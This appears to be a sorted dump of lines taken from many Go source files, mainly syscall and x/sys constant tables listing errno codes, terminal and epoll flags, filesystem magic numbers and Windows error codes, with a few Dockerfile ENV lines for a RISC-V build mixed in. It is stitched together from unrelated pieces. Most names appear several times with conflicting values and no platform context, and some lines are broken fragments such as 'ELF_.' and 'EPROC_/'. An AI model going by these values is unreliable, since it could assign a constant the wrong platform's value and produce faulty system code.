ECHO                                    = 0x8
ECHO                              = 0x8
ECHO                            = 0x00000008
ECHO                           = 0x8
ECHO                          = 0x8
ECHOCTL                                 = 0x40
ECHOCTL                           = 0x40
ECHOCTL                          = 0x200
ECHOCTL                          = 0x40
ECHOCTL                        = 0x40
ECHOCTL                       = 0x200
ECHOCTL                       = 0x20000
ECHOE                                   = 0x2
ECHOE                             = 0x2
ECHOE                            = 0x10
ECHOE                            = 0x2
ECHOE                          = 0x2
ECHOE                         = 0x10
ECHOK                                   = 0x4
ECHOK                             = 0x4
ECHOK                            = 0x20
ECHOK                            = 0x4
ECHOK                          = 0x4
ECHOK                         = 0x20
ECHOKE                                  = 0x1
ECHOKE                            = 0x1
ECHOKE                           = 0x1
ECHOKE                           = 0x800
ECHOKE                         = 0x1
ECHOKE                        = 0x800
ECHOKE                        = 0x80000
ECHONL                                  = 0x10
ECHONL                            = 0x10
ECHONL                           = 0x10
ECHONL                           = 0x40
ECHONL                          = 0x00000001
ECHONL                         = 0x10
ECHONL                        = 0x40
ECHOPRT                                 = 0x20
ECHOPRT                           = 0x20
ECHOPRT                          = 0x20
ECHOPRT                          = 0x400
ECHOPRT                        = 0x20
ECHOPRT                       = 0x400
ECHOPRT                       = 0x40000
ECHRNG          = syscall.Errno(0x25)
ECHRNG          = syscall.Errno(0x2c)
ECHRNG          = syscall.Errno(0x5e)
ECH_ICMPID                    = 0x2
ECLONEME        = syscall.Errno(0x52)
ECMSERR            = Errno(157)
ECMSESMERR         = Errno(230)
ECMSINITIAL        = Errno(156)
ECMSPFSFILE        = Errno(159)
ECMSPFSPERM        = Errno(162)
ECMSSTORAGE        = Errno(151)
ECOMM              = Errno(1147)
ECOMM           = syscall.Errno(0x46)
ECOMM           = syscall.Errno(0x55)
ECONNABORTED       = Errno(1120)
ECONNABORTED    = syscall.Errno(0x35)
ECONNABORTED    = syscall.Errno(0x48)
ECONNABORTED    = syscall.Errno(0x67)
ECONNABORTED    = syscall.Errno(0x82)
ECONNREFUSED       = Errno(1128)
ECONNREFUSED    = syscall.Errno(0x3d)
ECONNREFUSED    = syscall.Errno(0x4f)
ECONNREFUSED    = syscall.Errno(0x6f)
ECONNREFUSED    = syscall.Errno(0x92)
ECONNRESET         = Errno(1121)
ECONNRESET      = syscall.Errno(0x36)
ECONNRESET      = syscall.Errno(0x49)
ECONNRESET      = syscall.Errno(0x68)
ECONNRESET      = syscall.Errno(0x83)
ECORRUPT        = syscall.Errno(0x59)
ECPERR             = Errno(231)
ECRYPTFS_SUPER_MAGIC                        = 0xf15f
ECUNERR            = Errno(262)
ECUNNOCONV         = Errno(259)
ECUNNOENV          = Errno(258)
ECUNNOTALIGNED     = Errno(260)
EDEADLK            = Errno(116)
EDEADLK         = syscall.Errno(0x23)
EDEADLK         = syscall.Errno(0x2d)
EDEADLK         = syscall.Errno(0x4e)
EDEADLK         = syscall.Errno(0xb)
EDEADLOCK       = syscall.Errno(0x23)
EDEADLOCK       = syscall.Errno(0x38)
EDEADLOCK       = syscall.Errno(0x3a)
EDEADLOCK       = syscall.Errno(0x6c)
EDESTADDREQ     = syscall.Errno(0x3a)
EDESTADDRREQ       = Errno(1106)
EDESTADDRREQ    = syscall.Errno(0x27)
EDESTADDRREQ    = syscall.Errno(0x3a)
EDESTADDRREQ    = syscall.Errno(0x59)
EDESTADDRREQ    = syscall.Errno(0x60)
EDEVERR         = syscall.Errno(0x53)
EDIST           = syscall.Errno(0x35)
EDOM               = Errno(1)
EDOM            = syscall.Errno(0x21)
EDOM        = syscall.Errno(0x21)
EDOOFUS         = syscall.Errno(0x58)
EDOTDOT            = Errno(1150)
EDOTDOT         = syscall.Errno(0x49)
EDOTDOT         = syscall.Errno(0x58)
EDQUOT             = Errno(1133)
EDQUOT          = syscall.Errno(0x31)
EDQUOT          = syscall.Errno(0x45)
EDQUOT          = syscall.Errno(0x46d)
EDQUOT          = syscall.Errno(0x58)
EDQUOT          = syscall.Errno(0x7a)
EEXIST             = Errno(117)
EEXIST          = syscall.Errno(0x11)
EEXIST      = syscall.Errno(0x11)
EEXTLINK           = Errno(228)
EFAULT             = Errno(118)
EFAULT          = syscall.Errno(0xe)
EFAULT      = syscall.Errno(0xe)
EFBIG              = Errno(119)
EFBIG           = syscall.Errno(0x1b)
EFBIG       = syscall.Errno(0x1b)
EFD_CLOEXEC                      = 0x400000
EFD_CLOEXEC                      = 0x80000
EFD_NONBLOCK                     = 0x4000
EFD_NONBLOCK                     = 0x80
EFD_NONBLOCK                     = 0x800
EFD_SEMAPHORE                               = 0x1
EFIVARFS_MAGIC                              = 0xde5e81e4
EFORMAT         = syscall.Errno(0x30)
EFPMASKINV         = Errno(202)
EFPMODEINV         = Errno(203)
EFS_SUPER_MAGIC                             = 0x414a53
EFTYPE          = syscall.Errno(0x4f)
EHOSTDOWN          = Errno(1129)
EHOSTDOWN       = syscall.Errno(0x40)
EHOSTDOWN       = syscall.Errno(0x50)
EHOSTDOWN       = syscall.Errno(0x70)
EHOSTDOWN       = syscall.Errno(0x93)
EHOSTUNREACH       = Errno(1130)
EHOSTUNREACH    = syscall.Errno(0x41)
EHOSTUNREACH    = syscall.Errno(0x51)
EHOSTUNREACH    = syscall.Errno(0x71)
EHOSTUNREACH    = syscall.Errno(0x94)
EHWPOISON       = syscall.Errno(0x85)
EHWPOISON       = syscall.Errno(0x87)
EHWPOISON       = syscall.Errno(0xa8)
EIBMBADCALL        = Errno(1000)
EIBMBADPARM        = Errno(1001)
EIBMBADTCPNAME     = Errno(1011)
EIBMCANCELLED      = Errno(1009)
EIBMCONFLICT       = Errno(1008)
EIBMIUCVERR        = Errno(1004)
EIBMSOCKINUSE      = Errno(1003)
EIBMSOCKOUTOFRANGE = Errno(1002)
EIDRM              = Errno(1141)
EIDRM           = syscall.Errno(0x24)
EIDRM           = syscall.Errno(0x2b)
EIDRM           = syscall.Errno(0x4d)
EIDRM           = syscall.Errno(0x52)
EIDRM           = syscall.Errno(0x59)
EIDRM           = syscall.Errno(0x5a)
EILSEQ             = Errno(147)
EILSEQ          = syscall.Errno(0x54)
EILSEQ          = syscall.Errno(0x55)
EILSEQ          = syscall.Errno(0x56)
EILSEQ          = syscall.Errno(0x58)
EILSEQ          = syscall.Errno(0x5c)
EILSEQ          = syscall.Errno(0x74)
EILSEQ          = syscall.Errno(0x7a)
EINIT           = syscall.Errno(0x8d)
EINPROGRESS        = Errno(1103)
EINPROGRESS     = syscall.Errno(0x24)
EINPROGRESS     = syscall.Errno(0x37)
EINPROGRESS     = syscall.Errno(0x73)
EINPROGRESS     = syscall.Errno(0x96)
EINTR              = Errno(120)
EINTR           = syscall.Errno(0x4)
EINTR       = syscall.Errno(0x4)
EINTRNODATA        = Errno(1159)
EINVAL             = Errno(121)
EINVAL          = syscall.Errno(0x16)
EINVAL      = syscall.Errno(0x16)
EIO                = Errno(122)
EIO             = syscall.Errno(0x5)
EIO         = syscall.Errno(0x5)
EIPSEC          = syscall.Errno(0x52)
EISCONN            = Errno(1123)
EISCONN         = syscall.Errno(0x38)
EISCONN         = syscall.Errno(0x4b)
EISCONN         = syscall.Errno(0x6a)
EISCONN         = syscall.Errno(0x85)
EISDIR             = Errno(123)
EISDIR          = syscall.Errno(0x15)
EISDIR      = syscall.Errno(0x15)
EISNAM          = syscall.Errno(0x78)
EISNAM          = syscall.Errno(0x8b)
EKEYEXPIRED     = syscall.Errno(0x7f)
EKEYEXPIRED     = syscall.Errno(0x81)
EKEYEXPIRED     = syscall.Errno(0xa2)
EKEYREJECTED    = syscall.Errno(0x81)
EKEYREJECTED    = syscall.Errno(0x83)
EKEYREJECTED    = syscall.Errno(0xa4)
EKEYREVOKED     = syscall.Errno(0x80)
EKEYREVOKED     = syscall.Errno(0x82)
EKEYREVOKED     = syscall.Errno(0xa3)
EL2HLT          = syscall.Errno(0x2c)
EL2HLT          = syscall.Errno(0x33)
EL2HLT          = syscall.Errno(0x65)
EL2NSYNC        = syscall.Errno(0x26)
EL2NSYNC        = syscall.Errno(0x2d)
EL2NSYNC        = syscall.Errno(0x5f)
EL3HLT          = syscall.Errno(0x27)
EL3HLT          = syscall.Errno(0x2e)
EL3HLT          = syscall.Errno(0x60)
EL3RST          = syscall.Errno(0x28)
EL3RST          = syscall.Errno(0x2f)
EL3RST          = syscall.Errno(0x61)
ELAST           = syscall.Errno(0x5b)
ELAST           = syscall.Errno(0x5f)
ELAST           = syscall.Errno(0x60)
ELAST           = syscall.Errno(0x63)
ELAST           = syscall.Errno(0x6a)
ELEFENCE           = Errno(244)
ELEMSGERR          = Errno(201)
ELEMULTITHREAD     = Errno(232)
ELEMULTITHREADFORK = Errno(257)
ELENOFORK          = Errno(200)
ELF_.
ELIBACC         = syscall.Errno(0x4f)
ELIBACC         = syscall.Errno(0x53)
ELIBACC         = syscall.Errno(0x72)
ELIBBAD         = syscall.Errno(0x50)
ELIBBAD         = syscall.Errno(0x54)
ELIBBAD         = syscall.Errno(0x70)
ELIBEXEC        = syscall.Errno(0x53)
ELIBEXEC        = syscall.Errno(0x57)
ELIBEXEC        = syscall.Errno(0x6e)
ELIBMAX         = syscall.Errno(0x52)
ELIBMAX         = syscall.Errno(0x56)
ELIBMAX         = syscall.Errno(0x7b)
ELIBSCN         = syscall.Errno(0x51)
ELIBSCN         = syscall.Errno(0x55)
ELIBSCN         = syscall.Errno(0x7c)
ELNRNG          = syscall.Errno(0x29)
ELNRNG          = syscall.Errno(0x30)
ELNRNG          = syscall.Errno(0x62)
ELOCKUNMAPPED   = syscall.Errno(0x48)
ELOOP              = Errno(146)
ELOOP           = syscall.Errno(0x28)
ELOOP           = syscall.Errno(0x3e)
ELOOP           = syscall.Errno(0x55)
ELOOP           = syscall.Errno(0x5a)
EMEDIA          = syscall.Errno(0x6e)
EMEDIUMTYPE     = syscall.Errno(0x56)
EMEDIUMTYPE     = syscall.Errno(0x7c)
EMEDIUMTYPE     = syscall.Errno(0x7e)
EMEDIUMTYPE     = syscall.Errno(0xa0)
EMFILE             = Errno(124)
EMFILE          = syscall.Errno(0x18)
EMFILE      = syscall.Errno(0x18)
EMLINK             = Errno(125)
EMLINK          = syscall.Errno(0x1f)
EMLINK      = syscall.Errno(0x1f)
EMPTY_SET                     = 0x0
EMSGSIZE           = Errno(1107)
EMSGSIZE        = syscall.Errno(0x28)
EMSGSIZE        = syscall.Errno(0x3b)
EMSGSIZE        = syscall.Errno(0x5a)
EMSGSIZE        = syscall.Errno(0x61)
EMT_CPCOVF                    = 0x1
EMT_TAGOVF                        = 0x1
EMT_TAGOVF                       = 0x1
EMULTIHOP          = Errno(1149)
EMULTIHOP       = syscall.Errno(0x48)
EMULTIHOP       = syscall.Errno(0x4a)
EMULTIHOP       = syscall.Errno(0x57)
EMULTIHOP       = syscall.Errno(0x5a)
EMULTIHOP       = syscall.Errno(0x5e)
EMULTIHOP       = syscall.Errno(0x5f)
EMULTIHOP       = syscall.Errno(0x7d)
EMUL_ENABLED                      = 0x1
EMUL_LINUX                        = 0x1
EMUL_LINUX32                      = 0x5
EMUL_MAXID                        = 0x6
EMUL_NATIVE                       = 0x2
EMVSARMERROR       = Errno(172)
EMVSBADCHAR        = Errno(160)
EMVSCATLG          = Errno(153)
EMVSCPLERROR       = Errno(171)
EMVSCVAF           = Errno(152)
EMVSDYNALC         = Errno(151)
EMVSERR            = Errno(157)
EMVSEXPIRE         = Errno(168)
EMVSINITIAL        = Errno(156)
EMVSNORTL          = Errno(167)
EMVSNOTUP          = Errno(150)
EMVSPARM           = Errno(158)
EMVSPASSWORD       = Errno(169)
EMVSPATHOPTS       = Errno(166)
EMVSPFSFILE        = Errno(159)
EMVSPFSPERM        = Errno(162)
EMVSSAF2ERR        = Errno(164)
EMVSSAFEXTRERR     = Errno(163)
EMVSTODNOTSET      = Errno(165)
EMVSWLMERROR       = Errno(170)
ENABLE_AUTO_POSITION          = 0x100
ENABLE_ECHO_INPUT             = 0x4
ENABLE_EXTENDED_FLAGS         = 0x80
ENABLE_INSERT_MODE            = 0x20
ENABLE_LINE_INPUT             = 0x2
ENABLE_LVB_GRID_WORLDWIDE          = 0x10
ENABLE_MOUSE_INPUT            = 0x10
ENABLE_PROCESSED_INPUT        = 0x1
ENABLE_PROCESSED_OUTPUT            = 0x1
ENABLE_QUICK_EDIT_MODE        = 0x40
ENABLE_VIRTUAL_TERMINAL_INPUT = 0x200
ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x4
ENABLE_WINDOW_INPUT           = 0x8
ENABLE_WRAP_AT_EOL_OUTPUT          = 0x2
ENAMETOOLONG       = Errno(126)
ENAMETOOLONG    = syscall.Errno(0x24)
ENAMETOOLONG    = syscall.Errno(0x3f)
ENAMETOOLONG    = syscall.Errno(0x4e)
ENAMETOOLONG    = syscall.Errno(0x56)
ENAVAIL         = syscall.Errno(0x77)
ENAVAIL         = syscall.Errno(0x8a)
ENCODING_DEFAULT                            = 0x0
ENCODING_FM_MARK                            = 0x3
ENCODING_FM_SPACE                           = 0x4
ENCODING_MANCHESTER                         = 0x5
ENCODING_NRZ                                = 0x1
ENCODING_NRZI                               = 0x2
ENCRYPTION_MODE
ENDRUNDISC                        = 0x9
ENEEDAUTH       = syscall.Errno(0x51)
ENETDOWN           = Errno(1117)
ENETDOWN        = syscall.Errno(0x32)
ENETDOWN        = syscall.Errno(0x45)
ENETDOWN        = syscall.Errno(0x64)
ENETDOWN        = syscall.Errno(0x7f)
ENETRESET          = Errno(1119)
ENETRESET       = syscall.Errno(0x34)
ENETRESET       = syscall.Errno(0x47)
ENETRESET       = syscall.Errno(0x66)
ENETRESET       = syscall.Errno(0x81)
ENETUNREACH        = Errno(1118)
ENETUNREACH     = syscall.Errno(0x33)
ENETUNREACH     = syscall.Errno(0x46)
ENETUNREACH     = syscall.Errno(0x65)
ENETUNREACH     = syscall.Errno(0x80)
ENFILE             = Errno(127)
ENFILE          = syscall.Errno(0x17)
ENFILE      = syscall.Errno(0x17)
ENOANO          = syscall.Errno(0x35)
ENOANO          = syscall.Errno(0x37)
ENOANO          = syscall.Errno(0x69)
ENOATTR         = syscall.Errno(0x53)
ENOATTR         = syscall.Errno(0x57)
ENOATTR         = syscall.Errno(0x5d)
ENOATTR         = syscall.Errno(0x70)
ENOBUFS            = Errno(1122)
ENOBUFS         = syscall.Errno(0x37)
ENOBUFS         = syscall.Errno(0x4a)
ENOBUFS         = syscall.Errno(0x69)
ENOBUFS         = syscall.Errno(0x84)
ENOCONNECT      = syscall.Errno(0x32)
ENOCSI          = syscall.Errno(0x2b)
ENOCSI          = syscall.Errno(0x32)
ENOCSI          = syscall.Errno(0x64)
ENODATA            = Errno(148)
ENODATA         = syscall.Errno(0x3d)
ENODATA         = syscall.Errno(0x59)
ENODATA         = syscall.Errno(0x60)
ENODATA         = syscall.Errno(0x6f)
ENODATA         = syscall.Errno(0x7a)
ENODD              = Errno(229)
ENODEV             = Errno(128)
ENODEV          = syscall.Errno(0x13)
ENODEV      = syscall.Errno(0x13)
ENOENT             = Errno(129)
ENOENT          = syscall.Errno(0x2)
ENOENT      = syscall.Errno(0x2)
ENOEXEC            = Errno(130)
ENOEXEC         = syscall.Errno(0x8)
ENOEXEC     = syscall.Errno(0x8)
ENOKEY          = syscall.Errno(0x7e)
ENOKEY          = syscall.Errno(0x80)
ENOKEY          = syscall.Errno(0xa1)
ENOLCK             = Errno(131)
ENOLCK          = syscall.Errno(0x25)
ENOLCK          = syscall.Errno(0x2e)
ENOLCK          = syscall.Errno(0x31)
ENOLCK          = syscall.Errno(0x4d)
ENOLCK          = syscall.Errno(0x4f)
ENOLINK            = Errno(1144)
ENOLINK         = syscall.Errno(0x43)
ENOLINK         = syscall.Errno(0x52)
ENOLINK         = syscall.Errno(0x5b)
ENOLINK         = syscall.Errno(0x5f)
ENOLINK         = syscall.Errno(0x61)
ENOLINK         = syscall.Errno(0x7e)
ENOMEDIUM       = syscall.Errno(0x55)
ENOMEDIUM       = syscall.Errno(0x5d)
ENOMEDIUM       = syscall.Errno(0x7b)
ENOMEDIUM       = syscall.Errno(0x7d)
ENOMEDIUM       = syscall.Errno(0x9f)
ENOMEM             = Errno(132)
ENOMEM          = syscall.Errno(0xc)
ENOMEM      = syscall.Errno(0xc)
ENOMOVE            = Errno(1161)
ENOMSG             = Errno(1139)
ENOMSG          = syscall.Errno(0x23)
ENOMSG          = syscall.Errno(0x2a)
ENOMSG          = syscall.Errno(0x4b)
ENOMSG          = syscall.Errno(0x53)
ENOMSG          = syscall.Errno(0x5a)
ENOMSG          = syscall.Errno(0x5b)
ENONET             = Errno(1142)
ENONET          = syscall.Errno(0x40)
ENONET          = syscall.Errno(0x50)
ENOPKG          = syscall.Errno(0x41)
ENOPKG          = syscall.Errno(0x71)
ENOPOLICY       = syscall.Errno(0x67)
ENOPROTOOPT        = Errno(1109)
ENOPROTOOPT     = syscall.Errno(0x2a)
ENOPROTOOPT     = syscall.Errno(0x3d)
ENOPROTOOPT     = syscall.Errno(0x5c)
ENOPROTOOPT     = syscall.Errno(0x63)
ENOREUSE           = Errno(1160)
ENOSPC             = Errno(133)
ENOSPC          = syscall.Errno(0x1c)
ENOSPC      = syscall.Errno(0x1c)
ENOSR              = Errno(1138)
ENOSR           = syscall.Errno(0x3f)
ENOSR           = syscall.Errno(0x4a)
ENOSR           = syscall.Errno(0x5a)
ENOSR           = syscall.Errno(0x62)
ENOSR           = syscall.Errno(0x76)
ENOSTR             = Errno(1136)
ENOSTR          = syscall.Errno(0x3c)
ENOSTR          = syscall.Errno(0x48)
ENOSTR          = syscall.Errno(0x5b)
ENOSTR          = syscall.Errno(0x63)
ENOSTR          = syscall.Errno(0x7b)
ENOSYS             = Errno(134)
ENOSYS          = syscall.Errno(0x26)
ENOSYS          = syscall.Errno(0x4e)
ENOSYS          = syscall.Errno(0x59)
ENOSYS          = syscall.Errno(0x5a)
ENOSYS          = syscall.Errno(0x6d)
ENOTACTIVE      = syscall.Errno(0x49)
ENOTBLK            = Errno(1100)
ENOTBLK         = syscall.Errno(0xf)
ENOTBLK     = syscall.Errno(0xf)
ENOTCAPABLE     = syscall.Errno(0x5d)
ENOTCONN           = Errno(1124)
ENOTCONN        = syscall.Errno(0x39)
ENOTCONN        = syscall.Errno(0x4c)
ENOTCONN        = syscall.Errno(0x6b)
ENOTCONN        = syscall.Errno(0x86)
ENOTDIR            = Errno(135)
ENOTDIR         = syscall.Errno(0x14)
ENOTDIR     = syscall.Errno(0x14)
ENOTEMPTY          = Errno(136)
ENOTEMPTY       = syscall.Errno(0x11)
ENOTEMPTY       = syscall.Errno(0x27)
ENOTEMPTY       = syscall.Errno(0x42)
ENOTEMPTY       = syscall.Errno(0x5d)
ENOTNAM         = syscall.Errno(0x76)
ENOTNAM         = syscall.Errno(0x89)
ENOTREADY       = syscall.Errno(0x2e)
ENOTRECOVERABLE = syscall.Errno(0x3b)
ENOTRECOVERABLE = syscall.Errno(0x5d)
ENOTRECOVERABLE = syscall.Errno(0x5e)
ENOTRECOVERABLE = syscall.Errno(0x5f)
ENOTRECOVERABLE = syscall.Errno(0x68)
ENOTRECOVERABLE = syscall.Errno(0x83)
ENOTRECOVERABLE = syscall.Errno(0x85)
ENOTRECOVERABLE = syscall.Errno(0xa6)
ENOTRUST        = syscall.Errno(0x72)
ENOTSAFE           = Errno(249)
ENOTSOCK           = Errno(1105)
ENOTSOCK        = syscall.Errno(0x26)
ENOTSOCK        = syscall.Errno(0x39)
ENOTSOCK        = syscall.Errno(0x58)
ENOTSOCK        = syscall.Errno(0x5f)
ENOTSUP            = Errno(247)
ENOTSUP         = syscall.Errno(0x2d)
ENOTSUP         = syscall.Errno(0x30)
ENOTSUP         = syscall.Errno(0x56)
ENOTSUP         = syscall.Errno(0x5b)
ENOTSUP         = syscall.Errno(0x5f)
ENOTSUP         = syscall.Errno(0x7a)
ENOTSUP         = syscall.Errno(0x7c)
ENOTTY             = Errno(137)
ENOTTY          = syscall.Errno(0x19)
ENOTTY      = syscall.Errno(0x19)
ENOTUNIQ        = syscall.Errno(0x4c)
ENOTUNIQ        = syscall.Errno(0x50)
ENOTUNIQ        = syscall.Errno(0x73)
ENUM_E_FIRST                                                              syscall.Errno = 0x800401B0
ENUM_E_LAST                                                               syscall.Errno = 0x800401BF
ENUM_S_FIRST                                                              syscall.Errno = 0x000401B0
ENUM_S_LAST                                                               syscall.Errno = 0x000401BF
ENV GOOS=${GOOS} GOARCH=${GOARCH} CGO_ENABLED=0 GOFLAGS='-v -ldflags=-s -ldflags=-w'
ENV GOOS=linux GOARCH=riscv CGO_ENABLED=0 GOFLAGS='-v -ldflags=-s -ldflags=-w'
ENV GOROOT=/riscv-go
ENV PATH=/riscv-go/misc/riscv:/riscv-go/bin:$PATH
ENXIO              = Errno(138)
ENXIO           = syscall.Errno(0x6)
ENXIO       = syscall.Errno(0x6)
EN_SW_CTL_INF                     = 0x1000
EN_SW_CTL_PREC                    = 0x300
EN_SW_CTL_ROUND                   = 0xc00
EN_SW_DATACHAIN                   = 0x80
EN_SW_DENORM                      = 0x2
EN_SW_INVOP                       = 0x1
EN_SW_OVERFLOW                    = 0x8
EN_SW_PRECLOSS                    = 0x20
EN_SW_UNDERFLOW                   = 0x10
EN_SW_ZERODIV                     = 0x4
EOFFLOADboxDOWN    = Errno(1007)
EOFFLOADboxERROR   = Errno(1005)
EOFFLOADboxRESTART = Errno(1006)
EOPNOTSUPP         = Errno(1112)
EOPNOTSUPP      = syscall.Errno(0x2d)
EOPNOTSUPP      = syscall.Errno(0x40)
EOPNOTSUPP      = syscall.Errno(0x5f)
EOPNOTSUPP      = syscall.Errno(0x66)
EOPNOTSUPP      = syscall.Errno(0x7a)
EOVERFLOW          = Errno(149)
EOVERFLOW       = syscall.Errno(0x4b)
EOVERFLOW       = syscall.Errno(0x4f)
EOVERFLOW       = syscall.Errno(0x54)
EOVERFLOW       = syscall.Errno(0x57)
EOVERFLOW       = syscall.Errno(0x5c)
EOVERFLOW       = syscall.Errno(0x7f)
EOWNERDEAD      = syscall.Errno(0x3a)
EOWNERDEAD      = syscall.Errno(0x5e)
EOWNERDEAD      = syscall.Errno(0x5f)
EOWNERDEAD      = syscall.Errno(0x60)
EOWNERDEAD      = syscall.Errno(0x69)
EOWNERDEAD      = syscall.Errno(0x82)
EOWNERDEAD      = syscall.Errno(0x84)
EOWNERDEAD      = syscall.Errno(0xa5)
EPERM              = Errno(139)
EPERM           = syscall.Errno(0x1)
EPERM       = syscall.Errno(0x1)
EPFNOSUPPORT       = Errno(1113)
EPFNOSUPPORT    = syscall.Errno(0x2e)
EPFNOSUPPORT    = syscall.Errno(0x41)
EPFNOSUPPORT    = syscall.Errno(0x60)
EPFNOSUPPORT    = syscall.Errno(0x7b)
EPIPE              = Errno(140)
EPIPE           = syscall.Errno(0x20)
EPIPE       = syscall.Errno(0x20)
EPOLLERR                                    = 0x8
EPOLLERR      = 0x8
EPOLLET                                     = 0x80000000
EPOLLEXCLUSIVE                              = 0x10000000
EPOLLHUP                                    = 0x10
EPOLLHUP      = 0x10
EPOLLIN                                     = 0x1
EPOLLIN       = 0x1
EPOLLMSG                                    = 0x400
EPOLLMSG      = 0x400
EPOLLONESHOT                                = 0x40000000
EPOLLOUT                                    = 0x4
EPOLLOUT      = 0x4
EPOLLPRI                                    = 0x2
EPOLLPRI      = 0x2
EPOLLRDBAND                                 = 0x80
EPOLLRDBAND   = 0x80
EPOLLRDHUP                                  = 0x2000
EPOLLRDNORM                                 = 0x40
EPOLLRDNORM   = 0x40
EPOLLWAKEUP                                 = 0x20000000
EPOLLWRBAND                                 = 0x200
EPOLLWRBAND   = 0x200
EPOLLWRNORM                                 = 0x100
EPOLLWRNORM   = 0x100
EPOLL_CLOEXEC                    = 0x400000
EPOLL_CLOEXEC                    = 0x80000
EPOLL_CTL_ADD                               = 0x1
EPOLL_CTL_ADD = 0x1
EPOLL_CTL_DEL                               = 0x2
EPOLL_CTL_DEL = 0x2
EPOLL_CTL_MOD                               = 0x3
EPOLL_CTL_MOD = 0x3
EPROCLIM           = Errno(1131)
EPROCLIM        = syscall.Errno(0x43)
EPROCLIM        = syscall.Errno(0x53)
EPROCUNAVAIL    = syscall.Errno(0x4c)
EPROC_/ 
EPROGMISMATCH   = syscall.Errno(0x4b)
EPROGUNAVAIL    = syscall.Errno(0x4a)
EPROTO             = Errno(1148)
EPROTO          = syscall.Errno(0x47)
EPROTO          = syscall.Errno(0x56)
EPROTO          = syscall.Errno(0x5c)
EPROTO          = syscall.Errno(0x5f)
EPROTO          = syscall.Errno(0x60)
EPROTO          = syscall.Errno(0x64)
EPROTO          = syscall.Errno(0x79)
EPROTONOSUPPORT    = Errno(1110)
EPROTONOSUPPORT = syscall.Errno(0x2b)
EPROTONOSUPPORT = syscall.Errno(0x3e)
EPROTONOSUPPORT = syscall.Errno(0x5d)
EPROTONOSUPPORT = syscall.Errno(0x78)
EPROTOTYPE         = Errno(1108)
EPROTOTYPE      = syscall.Errno(0x29)
EPROTOTYPE      = syscall.Errno(0x3c)
EPROTOTYPE      = syscall.Errno(0x5b)
EPROTOTYPE      = syscall.Errno(0x62)
EPT_S_CANT_CREATE                                                         syscall.Errno = 1899
EPT_S_CANT_PERFORM_OP                                                     syscall.Errno = 1752
EPT_S_INVALID_ENTRY                                                       syscall.Errno = 1751
EPT_S_NOT_REGISTERED                                                      syscall.Errno = 1753
EPWROFF         = syscall.Errno(0x52)
EQFULL          = syscall.Errno(0x6a)
EQUALITY_CHECK                = 0x0
EQUIV_/ 
ERANGE             = Errno(2)
ERANGE          = syscall.Errno(0x22)
ERANGE      = syscall.Errno(0x22)
EREMCHG            = Errno(1151)
EREMCHG         = syscall.Errno(0x4e)
EREMCHG         = syscall.Errno(0x52)
EREMCHG         = syscall.Errno(0x59)
EREMDEV         = syscall.Errno(0x8e)
EREMOTE            = Errno(1135)
EREMOTE         = syscall.Errno(0x42)
EREMOTE         = syscall.Errno(0x47)
EREMOTE         = syscall.Errno(0x5d)
EREMOTEIO       = syscall.Errno(0x79)
EREMOTEIO       = syscall.Errno(0x8c)
ERESTART        = syscall.Errno(0x52)
ERESTART        = syscall.Errno(0x55)
ERESTART        = syscall.Errno(0x5b)
ERESTART        = syscall.Errno(0x74)
ERFKILL         = syscall.Errno(0x84)
ERFKILL         = syscall.Errno(0x86)
ERFKILL         = syscall.Errno(0xa7)
EROFS              = Errno(141)
EROFS           = syscall.Errno(0x1e)
EROFS       = syscall.Errno(0x1e)
EROFS_SUPER_MAGIC_V1                        = 0xe0f5e1e2
ERPCMISMATCH    = syscall.Errno(0x49)
ERREMOTE           = Errno(1143)
ERREMOTE        = syscall.Errno(0x51)
ERRMAX     = 128
ERROR_ABANDONED_WAIT_0                                                    syscall.Errno = 735
ERROR_ABANDONED_WAIT_63                                                   syscall.Errno = 736
ERROR_ABANDON_HIBERFILE                                                   syscall.Errno = 787
ERROR_ABIOS_ERROR                                                         syscall.Errno = 538
ERROR_ACCESS_AUDIT_BY_POLICY                                              syscall.Errno = 785
ERROR_ACCESS_DENIED                                                       syscall.Errno = 5
ERROR_ACCESS_DISABLED_BY_POLICY                                           syscall.Errno = 1260
ERROR_ACCESS_DISABLED_NO_SAFER_UI_BY_POLICY                               syscall.Errno = 786
ERROR_ACCESS_DISABLED_WEBBLADE                                            syscall.Errno = 1277
ERROR_ACCESS_DISABLED_WEBBLADE_TAMPER                                     syscall.Errno = 1278
ERROR_ACCOUNT_DISABLED                                                    syscall.Errno = 1331
ERROR_ACCOUNT_EXPIRED                                                     syscall.Errno = 1793
ERROR_ACCOUNT_LOCKED_OUT                                                  syscall.Errno = 1909
ERROR_ACCOUNT_RESTRICTION                                                 syscall.Errno = 1327
ERROR_ACPI_ERROR                                                          syscall.Errno = 669
ERROR_ACTIVATION_COUNT_EXCEEDED                                           syscall.Errno = 7059
ERROR_ACTIVE_CONNECTIONS                                                  syscall.Errno = 2402
ERROR_ADAP_HDW_ERR                                                        syscall.Errno = 57
ERROR_ADDRESS_ALREADY_ASSOCIATED                                          syscall.Errno = 1227
ERROR_ADDRESS_NOT_ASSOCIATED                                              syscall.Errno = 1228
ERROR_ADVANCED_INSTALLER_FAILED                                           syscall.Errno = 14099
ERROR_ALERTED                                                             syscall.Errno = 739
ERROR_ALIAS_EXISTS                                                        syscall.Errno = 1379
ERROR_ALLOCATE_BUCKET                                                     syscall.Errno = 602
ERROR_ALLOTTED_SPACE_EXCEEDED                                             syscall.Errno = 1344
ERROR_ALL_NODES_NOT_AVAILABLE                                             syscall.Errno = 5037
ERROR_ALL_SIDS_FILTERED                                                   Handle        = 0xC0090002
ERROR_ALL_USER_TRUST_QUOTA_EXCEEDED                                       syscall.Errno = 1933
ERROR_ALREADY_ASSIGNED                                                    syscall.Errno = 85
ERROR_ALREADY_EXISTS                                                      syscall.Errno = 183
ERROR_ALREADY_FIBER                                                       syscall.Errno = 1280
ERROR_ALREADY_HAS_STREAM_ID                                               syscall.Errno = 4444
ERROR_ALREADY_INITIALIZED                                                 syscall.Errno = 1247
ERROR_ALREADY_REGISTERED                                                  syscall.Errno = 1242
ERROR_ALREADY_RUNNING_LKG                                                 syscall.Errno = 1074
ERROR_ALREADY_THREAD                                                      syscall.Errno = 1281
ERROR_ALREADY_WAITING                                                     syscall.Errno = 1904
ERROR_ALREADY_WIN32                                                       syscall.Errno = 719
ERROR_AMBIGUOUS_SYSTEM_DEVICE                                             syscall.Errno = 15250
ERROR_API_UNAVAILABLE                                                     syscall.Errno = 15841
ERROR_APPCONTAINER_REQUIRED                                               syscall.Errno = 4251
ERROR_APPEXEC_CONDITION_NOT_SATISFIED                                     syscall.Errno = 3060
ERROR_APPEXEC_HANDLE_INVALIDATED                                          syscall.Errno = 3061
